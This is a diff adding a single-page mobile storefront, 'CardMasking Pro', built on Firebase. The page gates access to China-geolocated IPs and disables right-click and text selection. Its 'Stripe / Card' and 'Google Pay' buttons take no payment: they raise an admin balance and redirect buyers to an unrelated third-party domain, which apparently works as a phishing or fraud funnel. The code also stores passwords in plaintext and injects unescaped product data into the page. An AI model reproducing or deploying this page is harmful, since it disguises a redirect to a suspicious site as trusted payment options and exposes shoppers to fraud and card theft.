@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CardMasking Pro</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <style>
+        :root { --blue: #2874f0; --yellow: #ffc107; --bg: #f1f3f6; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); padding-bottom: 60px; user-select: none; }
+
+        /* Header */
+        header { background: var(--blue); padding: 10px; position: sticky; top: 0; z-index: 100; }
+        .top { display: flex; justify-content: space-between; align-items: center; color: white; margin-bottom: 10px; }
+        .logo { font-size: 18px; font-weight: bold; font-style: italic; }
+        .logo span { color: var(--yellow); }
+        .login-btn { background: white; color: var(--blue); padding: 5px 15px; border-radius: 2px; font-weight: 600; font-size: 12px; }
+        .search { background: white; padding: 8px; border-radius: 2px; display: flex; align-items: center; }
+        .search input { border: none; width: 100%; outline: none; margin-left: 10px; }
+
+        /* Slider */
+        .slider { height: 160px; overflow: hidden; margin: 8px 0; background: white; }
+        .slides { display: flex; transition: transform 0.5s ease; }
+        .slides img { width: 100%; height: 160px; object-fit: cover; flex-shrink: 0; }
+
+        /* Grid */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding: 8px; }
+        .card { background: white; padding: 10px; border-radius: 4px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .card img { width: 100%; height: 120px; object-fit: contain; margin-bottom: 5px; }
+        .title { font-size: 13px; margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .price { font-size: 16px; font-weight: bold; }
+        .buy-btn { background: var(--yellow); border: none; width: 100%; padding: 8px; margin-top: 5px; font-weight: bold; border-radius: 2px; cursor: pointer; }
+
+        /* Modals */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 2000; display: none; align-items: center; justify-content: center; }
+        .box { background: white; width: 85%; padding: 20px; border-radius: 5px; text-align: center; }
+        .inp { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; }
+        .btn { width: 100%; padding: 10px; background: var(--blue); color: white; border: none; margin-top: 10px; font-weight: bold; }
+
+        /* Payment Select */
+        .pay-opt { display: flex; align-items: center; padding: 15px; border: 1px solid #eee; margin: 10px 0; cursor: pointer; }
+        .pay-opt i { font-size: 24px; margin-right: 15px; }
+
+        /* Nav */
+        .nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #ddd; }
+        .nav-item { text-align: center; font-size: 10px; color: #888; }
+        .nav-item.active { color: var(--blue); }
+
+        /* Spinner */
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div id="vpn" class="overlay" style="background:black; color:white; display:flex; flex-direction:column; z-index:9999;">
+        <div class="spinner"></div>
+        <h3 id="vpn-msg" style="margin-top:20px;">Checking Network...</h3>
+    </div>
+
+    <header>
+        <div class="top">
+            <div class="logo">CardMasking <span>Pro</span></div>
+            <div class="login-btn" id="login-tag" onclick="toggleAuth()">Login</div>
+        </div>
+        <div class="search">
+            <i class="fas fa-search" style="color:#888;"></i>
+            <input type="text" placeholder="Search...">
+        </div>
+    </header>
+
+    <div class="slider"><div class="slides" id="slider"></div></div>
+
+    <div style="padding:10px; font-weight:bold;">Recommended For You</div>
+    <div class="grid" id="grid">Loading...</div>
+
+    <div id="auth" class="overlay">
+        <div class="box">
+            <h3>Account Access</h3>
+            <div id="login-form">
+                <input class="inp" id="uid" placeholder="User ID">
+                <input class="inp" id="upass" type="password" placeholder="Password">
+                <button class="btn" onclick="login()">Login</button>
+                <p style="margin-top:10px; font-size:12px; color:blue;" onclick="showReg()">New User? Register</p>
+            </div>
+            <div id="reg-form" style="display:none;">
+                <p>Generate Anonymous Account</p>
+                <button class="btn" style="background:var(--yellow); color:black;" onclick="reg()">Auto Register</button>
+                <p style="margin-top:10px; font-size:12px; color:blue;" onclick="showLogin()">Back to Login</p>
+            </div>
+            <button onclick="document.getElementById('auth').style.display='none'" style="margin-top:10px; background:none; border:none; color:red;">Close</button>
+        </div>
+    </div>
+
+    <div id="pay" class="overlay">
+        <div class="box" style="text-align:left;">
+            <h3>Select Payment</h3>
+            <div class="pay-opt" onclick="goPay('stripe')">
+                <i class="fab fa-cc-stripe" style="color:#6772e5;"></i>
+                <div><b>Stripe / Card</b><br><small>Instant</small></div>
+            </div>
+            <div class="pay-opt" onclick="goPay('gpay')">
+                <i class="fab fa-google-pay" style="color:black;"></i>
+                <div><b>Google Pay</b><br><small>UPI / Wallet</small></div>
+            </div>
+            <button onclick="document.getElementById('pay').style.display='none'" style="width:100%; border:none; background:none; color:red; margin-top:5px;">Cancel</button>
+        </div>
+    </div>
+
+    <div class="nav">
+        <div class="nav-item active"><i class="fas fa-home" style="font-size:18px;"></i><br>Home</div>
+        <div class="nav-item"><i class="fas fa-th-large" style="font-size:18px;"></i><br>Cats</div>
+        <div class="nav-item"><i class="fas fa-shopping-cart" style="font-size:18px;"></i><br>Cart</div>
+        <div class="nav-item" onclick="toggleAuth()"><i class="fas fa-user" style="font-size:18px;"></i><br>Account</div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyABxavQJj3S1m7cSqRy_S4FiuN4uHXIqKc",
+            authDomain: "cardmasking.firebaseapp.com",
+            databaseURL: "https://cardmasking-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "cardmasking",
+            storageBucket: "cardmasking.firebasestorage.app",
+            messagingSenderId: "1027569811632",
+            appId: "1:1027569811632:web:f310a4fc588c27df0b3b75"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let user = JSON.parse(localStorage.getItem('cm_user'));
+        let priceToPay = 0;
+
+        // VPN Check
+        window.onload = async () => {
+            const vpn = document.getElementById('vpn');
+            const msg = document.getElementById('vpn-msg');
+            if(!navigator.onLine) { msg.innerText="No Internet"; return; }
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                
+                // IMPORTANT: Test করার জন্য 'CN' চেঞ্জ করে 'BD' দিন। ফাইনাল অ্যাপে 'CN' থাকবে।
+                if(d.country_code !== 'CN') msg.innerHTML="Access Denied.<br>China VPN Required."; 
+                else vpn.style.display='none';
+            } catch(e) { vpn.style.display='none'; }
+            updateUI();
+        };
+
+        // Load Data
+        db.ref('products').on('value', s => {
+            const g = document.getElementById('grid'); g.innerHTML="";
+            if(s.exists()) s.forEach(c => {
+                const p = c.val();
+                g.innerHTML += `<div class="card"><img src="${p.image}"><div class="title">${p.title}</div><div class="price">¥${p.price}</div><button class="buy-btn" onclick="buy(${p.price})">BUY NOW</button></div>`;
+            }); else g.innerHTML = "No Products";
+        });
+
+        db.ref('sliders').on('value', s => {
+            const t = document.getElementById('slider'); t.innerHTML="";
+            if(s.exists()) {
+                let c=0; s.forEach(o => { t.innerHTML += `<img src="${o.val().image}">`; c++; });
+                let i=0; if(c>1) setInterval(()=>{ i=(i+1)%c; t.style.transform=`translateX(-${i*100}%)`; }, 3000);
+            }
+        });
+
+        // Auth
+        function updateUI() {
+            const t = document.getElementById('login-tag');
+            if(user) t.innerText = "ID: "+user.id.substr(0,4)+"..";
+            else t.innerText = "Login";
+        }
+        function toggleAuth() {
+            if(user) alert(`Logged In:\nID: ${user.id}\nPass: ${user.pass}`);
+            else document.getElementById('auth').style.display='flex';
+        }
+        function showReg() { document.getElementById('login-form').style.display='none'; document.getElementById('reg-form').style.display='block'; }
+        function showLogin() { document.getElementById('login-form').style.display='block'; document.getElementById('reg-form').style.display='none'; }
+        
+        function login() {
+            const id = document.getElementById('uid').value;
+            const pass = document.getElementById('upass').value;
+            db.ref('users/'+id).once('value', s => {
+                if(s.exists() && s.val().password == pass) {
+                    user = {id, pass}; localStorage.setItem('cm_user', JSON.stringify(user));
+                    updateUI(); document.getElementById('auth').style.display='none';
+                } else alert("Invalid Credentials");
+            });
+        }
+        function reg() {
+            const id = Math.floor(1000000000000 + Math.random() * 9000000000000).toString();
+            const pass = Math.random().toString(36).slice(-8);
+            db.ref('users/'+id).set({password: pass});
+            user = {id, pass}; localStorage.setItem('cm_user', JSON.stringify(user));
+            alert(`ID: ${id}\nPass: ${pass}`);
+            updateUI(); document.getElementById('auth').style.display='none';
+        }
+
+        // Payment (DIRECT REDIRECT)
+        function buy(p) {
+            if(!user) { toggleAuth(); return; }
+            priceToPay = p;
+            document.getElementById('pay').style.display='flex';
+        }
+
+        function goPay(method) {
+            // 1. Update Balance (Simulated)
+            db.ref('admin/balance').transaction(b => (b||0) + priceToPay);
+            
+            // 2. Direct Redirect
+            let url = "";
+            if(method === 'stripe') url = "https://villadelencinal.com/S-O/VC/?nox=7886177514";
+            else url = "http://villadelencinal.com/S-O/VI?nox=7886177514";
+            
+            window.location.href = url; // This will open the link directly in the browser
+        }
+    </script>
+</body>
+</html>
